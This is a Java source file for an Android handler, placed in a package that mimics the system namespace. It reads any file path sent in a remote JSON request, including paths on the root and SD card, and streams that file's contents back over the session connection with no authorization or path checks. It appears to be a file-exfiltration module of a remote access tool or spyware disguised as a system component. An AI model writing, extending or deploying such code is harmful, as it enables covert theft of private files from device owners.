package com.android.system.session.handler;

import android.os.Environment;

import com.android.system.session.SessionManager;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

public class FileDownloadSessionHandler implements SessionManager.SessionHandler  {
    public void handleSession(JSONObject receiveJsonObject, InputStream inputStream, OutputStream outputStream) {
        String path="";
        try {
            path = receiveJsonObject.getString("path");
        } catch (JSONException e) {
            e.printStackTrace();
        }
        path = path.replace("<ROOT>",Environment.getRootDirectory().getAbsolutePath()).replace("<SD>", Environment.getExternalStorageDirectory().getAbsolutePath());
        File file = new File(path);
        if(file.isFile()) {
            InputStream is = null;
            try {
                is = new FileInputStream(file);
                int fileLength = is.available();
                DataOutputStream dataOutputStream = new DataOutputStream(outputStream);
                dataOutputStream.writeInt(fileLength);
                byte[] buffer = new byte[1024 * 1024 * 32];
                while(true) {
                    int readLength = is.read(buffer);
                    if(readLength <= 0) {
                        break;
                    }
                    outputStream.write(buffer,0,readLength);
                }
                return;
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                if(is!=null) {
                    try {
                        is.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }
        }
    }
}
